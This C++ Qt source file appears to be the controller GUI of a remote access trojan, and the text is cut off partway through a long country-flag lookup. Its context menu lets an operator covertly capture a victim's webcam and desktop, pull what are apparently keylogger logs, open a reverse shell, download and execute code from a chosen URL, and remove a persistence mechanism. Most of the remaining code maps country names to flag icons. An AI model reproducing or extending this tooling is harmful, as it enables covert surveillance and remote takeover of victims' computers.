#include "MainGui.h"
#include "models/Client.h"
#include "GuiMediator.h"
#include <QInputDialog>

MainGui::MainGui(QWidget* parent)
	: QMainWindow(parent)
{
	ui.setupUi(this);

	ui.mainTree->clear();

	ui.mainTree->setContextMenuPolicy(Qt::CustomContextMenu);
	connect(ui.mainTree, &QTreeWidget::customContextMenuRequested, this, &MainGui::onContextMenuRequested);

	/* // A row for testing
	auto node = new QTreeWidgetItem(ui.mainTree);
	node->setText(0, QString::number(23));

	node->setText(1, "Test");
	node->setText(2, "Test");
	*/
}

MainGui::~MainGui()
{
}


void MainGui::addClientPtr(const QSharedPointer<Client>& client)
{
	const bool __sortingEnabled = ui.mainTree->isSortingEnabled();
	ui.mainTree->setSortingEnabled(false);
	auto node = new QTreeWidgetItem(ui.mainTree);
	node->setText(0, QString::number(client->getId()));
	// node->setText(1, c->country);
	// setCountryFlag(node, c->country);
	node->setText(1, client->getPcName());
	node->setText(2, client->getOs());
	ui.mainTree->setSortingEnabled(__sortingEnabled);

	clients[client->getId()] = client;
}

void MainGui::removeClient(const Client& client)
{
	removeClient(client.getId());
}

void MainGui::removeClient(qint64 clientId)
{
	for (int i = ui.mainTree->topLevelItemCount() - 1; i >= 0; i--)
	{
		QTreeWidgetItem* item = ui.mainTree->takeTopLevelItem(i);
		if (item->text(0).toInt() == clientId)
		{
			clients.remove(clientId);
			delete item;
		}
	}
}


void MainGui::onContextMenuRequested(const QPoint& position)
{
	QMenu* menu = new QMenu(this);

	// connect(menu, SIGNAL(triggered(QAction*)), this, SLOT(onMenuTriggered(QAction*)));
	connect(menu, &QMenu::triggered, this, &MainGui::onMenuTriggered);
	currentSelected = ui.mainTree->itemAt(position);

	int index = ui.mainTree->indexOfTopLevelItem(currentSelected);
	if (index == -1)
		return;
	QString stringCam("Stream Camera");
	QString stringDesktop("Stream Desktop");
	QString stringChat("Open Chat");
	QString iconCamPath, iconRdpPath, iconKeyLogsPath, iconClosePath, iconUninsPath, iconChatPath, iconShellPath,
	        iconDownloadPath
	        , iconUploadPath;

	QIcon camIcon;
	QIcon rdpIcon;
	QIcon closeIcon;
	QIcon uninsIcon;
	QIcon keylogsIcon;
	QIcon chatIcon;
	QIcon iconUpload;
	QIcon iconDownload;
	QIcon iconShell;

	int clientId = currentSelected->text(0).toInt();
	QSharedPointer<Client> client = clients[clientId];
	// Usually you want to return, I don't because sometimes I add some testing rows
	if (client != nullptr)
	{
		if (!client->isStreamingWebcam())
		{
			stringCam = QString("Capture Webcam");
			iconCamPath = ":/images/resources/icons/Webcam-16.png";
		}
		else
		{
			stringCam = QString("Close Webcam");
			iconCamPath = ":/images/resources/icons/Webcam-16close.png";
		}

		if (!client->isStreamingDesktop())
		{
			stringDesktop = QString("Capture Desktop");
			iconRdpPath = ":/images/resources/icons/Monitor-16.png";
		}
		else
		{
			stringDesktop = QString("Close Remote Desktop");
			iconRdpPath = ":/images/resources/icons/Monitor-16 close.png";
		}

		if (!client->isClientChatting())
		{
			stringChat = "Open Chat";
		}
		else
		{
			stringChat = "Close Chat";
		}
	}

	QString stringClose("Close Connection");
	QString stringUninstall("Uninstall");
	QString stringLogs("Get Logs");
	QString stringShell("Remote Shell");
	QString stringDownload("Download File");
	QString stringDownloadAndExecute("Download & Execute");
	QString stringUpload("Upload File");
	QString infoExtended("Get client details");
	QString stringProcessList("Get process list");

	iconKeyLogsPath = ":/images/resources/icons/Keyboard-32.png";
	iconClosePath = ":/images/resources/icons/Cancel-32.png";
	iconUninsPath = ":/images/resources/icons/uninstall-32.png";
	iconChatPath = ":/images/resources/icons/Chat_open.png";
	iconShellPath = ":/images/resources/icons/gnome-terminal-32.png";
	iconDownloadPath = ":/images/resources/icons/download-32.png";
	iconUploadPath = ":/images/resources/icons/upload-32.png";

	camIcon.addFile(iconCamPath, QSize(), QIcon::Normal, QIcon::Off);
	rdpIcon.addFile(iconRdpPath, QSize(), QIcon::Normal, QIcon::Off);
	closeIcon.addFile(iconClosePath, QSize(), QIcon::Normal, QIcon::Off);
	uninsIcon.addFile(iconUninsPath, QSize(), QIcon::Normal, QIcon::Off);
	keylogsIcon.addFile(iconKeyLogsPath, QSize(), QIcon::Normal, QIcon::Off);
	chatIcon.addFile(iconChatPath, QSize(), QIcon::Normal, QIcon::Off);
	iconShell.addFile(iconShellPath, QSize(), QIcon::Normal, QIcon::Off);
	iconDownload.addFile(iconDownloadPath, QSize(), QIcon::Normal, QIcon::Off);
	iconUpload.addFile(iconUploadPath, QSize(), QIcon::Normal, QIcon::Off);


	actionCam = new QAction(camIcon, stringCam, this);
	getInfoExtended = new QAction(infoExtended, menu);

	QAction* actionDesktop = new QAction(rdpIcon, stringDesktop, this);
	QAction* actionProcessList = new QAction(stringProcessList, this);
	QAction* actionLogs = new QAction(keylogsIcon, stringLogs, this);

	actionChat = new QAction(chatIcon, stringChat, this);
	actionClose = new QAction(closeIcon, stringClose, this);
	actionUninstall = new QAction(uninsIcon, stringUninstall, this);
	actionShell = new QAction(iconShell, stringShell, this);
	actionDownload = new QAction(iconDownload, stringDownload, this);
	actionDownloadAndExecute = new QAction(iconDownload, stringDownloadAndExecute, this);

	QAction* actionUpload = new QAction(iconUpload, stringUpload, this);


	menu->addAction(getInfoExtended);
	menu->addAction(actionProcessList);
	menu->addAction(actionCam);
	menu->addAction(actionDesktop);
	menu->addAction(actionLogs);
	menu->addAction(actionChat);
	menu->addAction(actionShell);
	// menu->addAction(actionDownload);
	menu->addAction(actionDownloadAndExecute);
	// menu->addAction(actionUpload);
	menu->addAction(actionClose);
	menu->addAction(actionUninstall);

	// menu->exec(position); // for modal menu, execution will not proceed until user selects something
	menu->popup(ui.mainTree->viewport()->mapToGlobal(position));
}


void MainGui::onMenuTriggered(QAction* action)
{
	// We can perform the checks using a string comparison
	// or comparing the pointer QAction* with the one saved in the field of this class (preferred since it is faster)

	qDebug("triggered " + action->text().toLatin1());

	if (currentSelected != nullptr)
	{
		int clientId = currentSelected->text(0).toInt();

		QString cmdTxt = action->text();
		if (clients.size() == 0)
			return;
		if (cmdTxt.contains("client details", Qt::CaseSensitivity::CaseInsensitive))
		{
			const GuiEvent event(UiWindow::MainWindow, UiEventIntent::InfoIntent, UiEventAction::StartAction, clientId);
			emit sendEventToUiMediator(event);
		}
		else if (cmdTxt.contains("Capture Webcam", Qt::CaseInsensitive))
		{
			QSharedPointer<GuiEvent> event(new GuiEvent(UiWindow::MainWindow, UiEventIntent::CameraIntent,
			                                            UiEventAction::StartAction, clientId));
			emit sendEventToUiMediatorPtr(event);
		}
		else if (cmdTxt.contains("Capture Desktop"))
		{
			const GuiEvent event(UiWindow::MainWindow, UiEventIntent::DesktopIntent, UiEventAction::StartAction,
			                     clientId);
			emit sendEventToUiMediator(event);
		}
		else if (cmdTxt.contains("Get Logs"))
		{
		}
		else if (cmdTxt == "Open Chat")
		{
			const GuiEvent event(UiWindow::MainWindow,
			                     UiEventIntent::ChatIntent, UiEventAction::StartAction,
			                     clientId);
			emit sendEventToUiMediator(event);
		}
		else if (cmdTxt.contains("Process list", Qt::CaseSensitivity::CaseInsensitive))
		{
			const GuiEvent event(UiWindow::MainWindow, UiEventIntent::ProcessListIntent, UiEventAction::StartAction,
			                     clientId);
			emit sendEventToUiMediator(event);
		}
		else if (cmdTxt.contains("Close Connection"))
		{
			removeClient(clientId);

			const QSharedPointer<GuiEvent> uiEvent = QSharedPointer<GuiEvent>(
				new GuiEvent(UiWindow::MainWindow, UiEventIntent::ConnectionIntent, UiEventAction::StopAction,
				             clientId));
			emit sendEventToUiMediatorPtr(uiEvent);
		}
		else if (cmdTxt.startsWith("Uninstall", Qt::CaseSensitive))
		{
			removeClient(clientId);
			const GuiEvent uiEvent(UiWindow::MainWindow,
			                       UiEventIntent::Persistence,
			                       UiEventAction::StopAction,
			                       clientId);
			emit sendEventToUiMediator(uiEvent);
		}
		else if (cmdTxt.contains("Remote Shell", Qt::CaseInsensitive))
		{
			const GuiEvent event(UiWindow::MainWindow, UiEventIntent::ReverseShellIntent, UiEventAction::StartAction,
			                     clientId);
			emit sendEventToUiMediator(event);
		}
		else if (action == actionDownloadAndExecute)
		{
			bool ok;
			const QString text = QInputDialog::getText(this, tr("Enter a URL"),
			                                           tr("URL:"), QLineEdit::Normal, "", &ok);
			if (ok && !text.isEmpty())
			{
				GuiEvent event(UiWindow::MainWindow, UiEventIntent::DownloadAndExecute,
				               UiEventAction::StartAction, clientId);

				auto url = new QString(text);
				event.setData(url);

				emit sendEventToUiMediator(event);
			}
		}
		else if (cmdTxt.contains("Upload File", Qt::CaseInsensitive))
		{
		}
		else if (cmdTxt.contains("Close", Qt::CaseInsensitive))
		{
			if (cmdTxt.contains("Webcam", Qt::CaseInsensitive))
			{
			}
			else if (cmdTxt.contains("desktop", Qt::CaseInsensitive))
			{
			}
			else if (cmdTxt.contains("chat", Qt::CaseInsensitive))
			{
			}
		}
	}
}

void MainGui::setCountryFlag(QTreeWidgetItem* root, QString& country)
{
	QIcon countryIcon;
	QString iconPath = "";

	if (country.contains("Afghanistan", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Afghanistan.png");
	else if (country.contains("African Union(OAS)", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/African Union(OAS).png");
	else if (country.contains("Albania", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Albania.png");
	else if (country.contains("Algeria", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Algeria.png");
	else if (country.contains("American Samoa", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/American Samoa.png");
	else if (country.contains("Andorra", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Andorra.png");
	else if (country.contains("Angola", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Angola.png");
	else if (country.contains("Anguilla", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Anguilla.png");
	else if (country.contains("Antarctica", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Antarctica.png");
	else if (country.contains("Antigua & Barbuda", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Antigua & Barbuda.png");
	else if (country.contains("Arab League", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Arab League.png");
	else if (country.contains("Argentina", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Argentina.png");
	else if (country.contains("Armenia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Armenia.png");
	else if (country.contains("Aruba", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Aruba.png");
	else if (country.contains("ASEAN", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/ASEAN.png");
	else if (country.contains("Australia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Australia.png");
	else if (country.contains("Austria", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Austria.png");
	else if (country.contains("Azerbaijan", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Azerbaijan.png");
	else if (country.contains("Bahamas", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Bahamas.png");
	else if (country.contains("Bahrain", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Bahrain.png");
	else if (country.contains("Bangladesh", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Bangladesh.png");
	else if (country.contains("Barbados", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Barbados.png");
	else if (country.contains("Belarus", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Belarus.png");
	else if (country.contains("Belgium", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Belgium.png");
	else if (country.contains("Belize", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Belize.png");
	else if (country.contains("Benin", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Benin.png");
	else if (country.contains("Bermuda", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Bermuda.png");
	else if (country.contains("Bhutan", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Bhutan.png");
	else if (country.contains("Bolivia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Bolivia.png");
	else if (country.contains("Bosnia & Herzegovina", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Bosnia & Herzegovina.png");
	else if (country.contains("Botswana", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Botswana.png");
	else if (country.contains("Brazil", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Brazil.png");
	else if (country.contains("Brunei", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Brunei.png");
	else if (country.contains("Bulgaria", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Bulgaria.png");
	else if (country.contains("Burkina Faso", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Burkina Faso.png");
	else if (country.contains("Burundi", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Burundi.png");
	else if (country.contains("Cambodja", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Cambodja.png");
	else if (country.contains("Cameroon", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Cameroon.png");
	else if (country.contains("Canada", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Canada.png");
	else if (country.contains("Cape Verde", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Cape Verde.png");
	else if (country.contains("CARICOM", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/CARICOM.png");
	else if (country.contains("Cayman Islands", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Cayman Islands.png");
	else if (country.contains("Central African Republic", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Central African Republic.png");
	else if (country.contains("Chad", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Chad.png");
	else if (country.contains("Chile", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Chile.png");
	else if (country.contains("China", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/China.png");
	else if (country.contains("CIS", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/CIS.png");
	else if (country.contains("Colombia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Colombia.png");
	else if (country.contains("Commonwealth", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Commonwealth.png");
	else if (country.contains("Comoros", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Comoros.png");
	else if (country.contains("Congo-Brazzaville", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Congo-Brazzaville.png");
	else if (country.contains("Congo-Kinshasa(Zaire)", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Congo-Kinshasa(Zaire).png");
	else if (country.contains("Cook Islands", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Cook Islands.png");
	else if (country.contains("Costa Rica", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Costa Rica.png");
	else if (country.contains("Cote d'Ivoire", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Cote d'Ivoire.png");
	else if (country.contains("Croatia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Croatia.png");
	else if (country.contains("Cuba", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Cuba.png");
	else if (country.contains("Cyprus", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Cyprus.png");
	else if (country.contains("Czech Republic", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Czech Republic.png");
	else if (country.contains("Denmark", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Denmark.png");
	else if (country.contains("Djibouti", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Djibouti.png");
	else if (country.contains("Dominica", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Dominica.png");
	else if (country.contains("Dominican Republic", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Dominican Republic.png");
	else if (country.contains("Ecuador", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Ecuador.png");
	else if (country.contains("Egypt", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Egypt.png");
	else if (country.contains("El Salvador", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/El Salvador.png");
	else if (country.contains("England", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/England.png");
	else if (country.contains("Equatorial Guinea", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Equatorial Guinea.png");
	else if (country.contains("Eritrea", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Eritrea.png");
	else if (country.contains("Estonia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Estonia.png");
	else if (country.contains("Ethiopia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Ethiopia.png");
	else if (country.contains("European Union", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/European Union.png");
	else if (country.contains("Faroes", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Faroes.png");

	if (country.contains("Fiji", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Fiji.png");
	else if (country.contains("Finland", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Finland.png");
	else if (country.contains("France", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/France.png");
	else if (country.contains("Gabon", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Gabon.png");
	else if (country.contains("Gambia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Gambia.png");
	else if (country.contains("Georgia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Georgia.png");
	else if (country.contains("Germany", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Germany.png");
	else if (country.contains("Ghana", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Ghana.png");
	else if (country.contains("Gibraltar", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Gibraltar.png");
	else if (country.contains("Greece", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Greece.png");
	else if (country.contains("Greenland", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Greenland.png");
	else if (country.contains("Grenada", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Grenada.png");
	else if (country.contains("Guadeloupe", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Guadeloupe.png");
	else if (country.contains("Guam", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Guam.png");
	else if (country.contains("Guatemala", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Guatemala.png");
	else if (country.contains("Guernsey", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Guernsey.png");
	else if (country.contains("Guinea-Bissau", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Guinea-Bissau.png");
	else if (country.contains("Guinea", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Guinea.png");
	else if (country.contains("Guyana", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Guyana.png");
	else if (country.contains("Haiti", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Haiti.png");
	else if (country.contains("Honduras", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Honduras.png");
	else if (country.contains("Hong Kong", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Hong Kong.png");
	else if (country.contains("Hungary", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Hungary.png");
	else if (country.contains("Iceland", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Iceland.png");
	else if (country.contains("India", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/India.png");
	else if (country.contains("Indonesia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Indonesia.png");
	else if (country.contains("Iran", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Iran.png");
	else if (country.contains("Iraq", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Iraq.png");
	else if (country.contains("Ireland", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Ireland.png");


	if (country.contains("Islamic Conference", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Islamic Conference.png");
	else if (country.contains("Isle of Man", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Isle of Man.png");
	else if (country.contains("Israel", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Israel.png");
	else if (country.contains("Italy", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Italy.png");
	else if (country.contains("Jamaica", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Jamaica.png");
	else if (country.contains("Japan", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Japan.png");
	else if (country.contains("Jersey", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Jersey.png");
	else if (country.contains("Jordan", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Jordan.png");
	else if (country.contains("Kazakhstan", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Kazakhstan.png");
	else if (country.contains("Kenya", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Kenya.png");
	else if (country.contains("Kiribati", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Kiribati.png");
	else if (country.contains("Kosovo", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Kosovo.png");
	else if (country.contains("Kuwait", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Kuwait.png");
	else if (country.contains("Kyrgyzstan", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Kyrgyzstan.png");
	else if (country.contains("Laos", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Laos.png");
	else if (country.contains("Latvia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Latvia.png");
	else if (country.contains("Lebanon", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Lebanon.png");
	else if (country.contains("Lesotho", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Lesotho.png");
	else if (country.contains("Liberia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Liberia.png");
	else if (country.contains("Libya", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Libya.png");
	else if (country.contains("Liechtenstein", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Liechtenstein.png");
	else if (country.contains("LIthuania", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/LIthuania.png");
	else if (country.contains("Luxembourg", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Luxembourg.png");
	else if (country.contains("Macao", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Macao.png");
	else if (country.contains("Macedonia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Macedonia.png");
	else if (country.contains("Madagascar", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Madagascar.png");
	else if (country.contains("Malawi", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Malawi.png");
	else if (country.contains("Malaysia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Malaysia.png");
	else if (country.contains("Maldives", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Maldives.png");
	else if (country.contains("Mali", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Mali.png");
	else if (country.contains("Malta", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Malta.png");
	else if (country.contains("Marshall Islands", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Marshall Islands.png");
	else if (country.contains("Martinique", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Martinique.png");
	else if (country.contains("Mauritania", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Mauritania.png");
	else if (country.contains("Mauritius", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Mauritius.png");
	else if (country.contains("Mexico", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Mexico.png");
	else if (country.contains("Micronesia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Micronesia.png");
	else if (country.contains("Moldova", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Moldova.png");
	else if (country.contains("Monaco", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Monaco.png");
	else if (country.contains("Mongolia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Mongolia.png");
	else if (country.contains("Montenegro", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Montenegro.png");
	else if (country.contains("Montserrat", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Montserrat.png");
	else if (country.contains("Morocco", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Morocco.png");
	else if (country.contains("Mozambique", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Mozambique.png");
	else if (country.contains("Myanmar(Burma)", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Myanmar(Burma).png");
	else if (country.contains("Namibia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Namibia.png");
	else if (country.contains("NATO", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/NATO.png");
	else if (country.contains("Nauru", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Nauru.png");
	else if (country.contains("Nepal", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Nepal.png");
	else if (country.contains("Netherlands Antilles", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Netherlands Antilles.png");
	else if (country.contains("Netherlands", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Netherlands.png");
	else if (country.contains("New Caledonia", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/New Caledonia.png");
	else if (country.contains("New Zealand", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/New Zealand.png");
	else if (country.contains("Nicaragua", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Nicaragua.png");
	else if (country.contains("Niger", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Niger.png");
	else if (country.contains("Nigeria", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Nigeria.png");
	else if (country.contains("North Korea", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/North Korea.png");
	else if (country.contains("Northern Cyprus", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Northern Cyprus.png");
	else if (country.contains("Northern Ireland", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Northern Ireland.png");
	else if (country.contains("Norway", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Norway.png");
	else if (country.contains("Olimpic Movement", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Olimpic Movement.png");
	else if (country.contains("Oman", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Oman.png");
	else if (country.contains("OPEC", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/OPEC.png");
	else if (country.contains("Pakistan", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Pakistan.png");
	else if (country.contains("Palau", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Palau.png");
	else if (country.contains("Palestine", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Palestine.png");
	else if (country.contains("Panama", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Panama.png");
	else if (country.contains("Papua New Guinea", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Papua New Guinea.png");
	else if (country.contains("Paraguay", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Paraguay.png");
	else if (country.contains("Peru", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Peru.png");
	else if (country.contains("Philippines", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Philippines.png");
	else if (country.contains("Poland", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Poland.png");
	else if (country.contains("Portugal", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Portugal.png");
	else if (country.contains("Puerto Rico", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Puerto Rico.png");
	else if (country.contains("Qatar", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Qatar.png");
	else if (country.contains("Red Cross", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Red Cross.png");
	else if (country.contains("Reunion", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Reunion.png");
	else if (country.contains("Romania", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Romania.png");
	else if (country.contains("Russian Federation", Qt::CaseInsensitive))
		iconPath = QString(":icons/country/icons/country/Russian Federation.png");
	else if (country.contains("Rwanda", Qt::CaseInsensitive))
